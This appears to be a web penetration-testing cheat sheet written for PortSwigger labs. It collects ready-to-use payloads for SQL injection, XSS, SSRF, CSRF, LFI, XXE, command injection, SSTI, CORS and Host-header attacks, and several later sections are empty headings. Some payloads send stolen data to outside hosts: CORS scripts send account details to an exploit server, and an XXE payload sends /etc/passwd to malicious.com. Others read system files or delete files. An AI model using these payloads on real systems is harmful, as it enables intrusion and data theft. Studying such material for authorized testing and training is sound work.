
# SQLi

##### Error-based

```
' OR 1=1
' or 1=1; -- 
' OR '1
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -
' OR '' = '
```

##### UNION-based

```
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4--
' UNION SELECT NULL,NULL,NULL
' UNION SELECT "NULL","NULL","NULL"
' UNION SELECT "","",""
```

##### Time-based

```
');waitfor delay '0:0:5'--
' or pg_sleep(5)--
' or sleep(5)='
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--
```

##### Boolean-based

```
SELECT * FROM products WHERE id = 42 and 1=1
SELECT * FROM products WHERE id = 42 and 1=0
```


##### OUT-OF-BAND

```
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
```

### Auth Bypass

```
admin") or ("1"="1"--
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin") or "1"="1"/*
```

Github:

https://swisskyrepo.github.io/PayloadsAllTheThingsWeb/SQL%20Injection/#insert-statement-on-duplicate-key-update
# XSS

##### Reflected

```
<script>alert('XSS')</script>
"><script>alert('XSS')</script>
<script>eval('\x61lert(\'33\')')</script>
<script>\u0061lert('22')</script>
```
##### Stored

```
<img src=x onerror=alert('XSS');>
"><img src=x onerror=alert('XSS');>
<><img src=1 onerror=alert(1)>
<img src=x:alert(alt) onerror=eval(src) alt=xss>
<svgonload=alert(1)>
"><svg/onload=alert(/XSS/)
<svg><script>alert('33')
<svg><script>alert&lpar;'33'&rpar;
```

##### DOM

```
#"><img src=/ onerror=alert(2)>
```

##### Blind

https://github.com/LewisArdern/bXSS

Github:

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md

# SSRF

##### In-Band

```
http://localhost/admin
http://localhost:80
http://localhost:443
http://localhost:22
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
http://0.0.0.0:80
http://0.0.0.0:443
http://0.0.0.0:22
```

##### Blind

Try to insert burp-collaborator in Referrer header! then check dns/http responses.


Github:
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md


# CSRF

Testing CSRF Tokens:
1. Remove the CSRF token and see if application accepts request
2. Change the request method from POST to GET
3. See if CSRF token is tied to user session

Testing CSRF Tokens and CSRF cookies:
1. Check if the CSRF token is tied to the CSRF cookie
- Submit an invalid CSRF token
- Submit a valid CSRF token from another user
2. Submit valid CSRF token and cookie from another user

Select Engagement tools / Generate CSRF PoC. Enable the option to include an auto-submit script and click "Regenerate".

Form POC Ex-: 

```
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"> <input type="hidden" name="email" value="anything%40web-security-academy.net"> </form> <script> document.forms[0].submit(); </script>

```


Github :
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CSRF%20Injection/README.md

# LFI

```
../../../etc/passwd
../../../etc/passwd%00
%252e%252e%252fetc%252fpasswd
%252e%252e%252fetc%252fpasswd%00
....//....//etc/passwd
..///////..////..//////etc/passwd
/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
```

Github:
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md


# Information-Disclosure

1. Check application responses
2. Check Source Code
3. Check directory brute-force
4. Check error messages


# Access-Control

Check and manipulate request headers:

```
?admin=true
?role=1
/admin
/administrator-panel
// Check for IDORS
https://insecure-website.com/myaccount?id=456
```


# CORS

Evil JS Code Ex for basic reflection :-

```
<script> var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true; req.send(); function reqListener() { location='/log?key='+this.responseText; }; </script>
```

Evil JS Code Ex for trusting null :-

```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script> var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true; req.send(); function reqListener() { location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText); }; </script>"></iframe>
```

If parameter vulnerable to XSS 

```
<script> document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1" </script>
```


Github:
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CORS%20Misconfiguration/README.md

# XXE

##### in-band XXE

```
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>

##############################

<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>

##############################

<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>

##############################

<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>

##############################

<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>


```

##### Blind XXE

```
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net/x"> %ext;
]>
<r></r>

#################################

<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "file:///etc/passwd" >
<!ENTITY callhome SYSTEM "www.malicious.com/?%xxe;">
]
>
<foo>&callhome;</foo>


```


Github:
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md


# OS Command Injection

##### in-band

```
1|whoami
;system('cat%20/etc/passwd')
%0Acat%20/etc/passwd
```
##### blind 

```
email=x||ping+-c+10+127.0.0.1||
email=||whoami>/var/www/images/output.txt||
email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||
```


Github:
https://github.com/payloadbox/command-injection-payload-list

# SSTI

- Insert expressions to know the template working on the server-side, then look for the template documentation to write a payload for exploitation

```
{{7 * 7}}
${7 * 7}
<%= 7 * 7 %>
${{7 * 7}}
#{7 * 7}
```

ex:-

```
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }
```

# Business Logic

1. Check for application functions logic
2. Check for Positive and Negative values

# File upload

```
exploit.php
..%2fexploit.php
exploit.l33t
exploit.php%00.jpg
```

Use exiftool to comment a shell code in the photo!

Github:
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md

# HTTP Host header

1. Password-Reset Function through changing Host-header with evil server
- intercept the forgot-password request.
- change host-header to evil server.
- send request with the victim username.
- check for the user token in evil server and open it in the browser to change use password.
2. Authentication bypass through changing Host-header with localhost
- intercept /admin request
- change host to localhost


Github:
https://github.com/daffainfo/AllAboutBugBounty/blob/master/Host%20Header%20Injection.md

# Authentication

1. 2FA Bypass
2. Brute-force
3. Offline password crack
4. password- reset
5. Captcha-bypass


# OAuth 

Check for redirect-url

```
https://www.example.com/signin/authorize?[...]&redirect_uri=https://demo.example.com/loginsuccessful

####################################

https://www.example.com/signin/authorize?[...]&redirect_uri=https://localhost.evil.com
```


Github:
https://swisskyrepo.github.io/PayloadsAllTheThingsWeb/OAuth%20Misconfiguration/#executing-xss-via-redirect_uri


# HTTP Smuggling


##### TE-CL


##### CL-TE


##### TE-TE


# Insecure deserialization


# JWT


# GraphQL



# Race-Conditions



# NoSQL Injection



# API-Testing


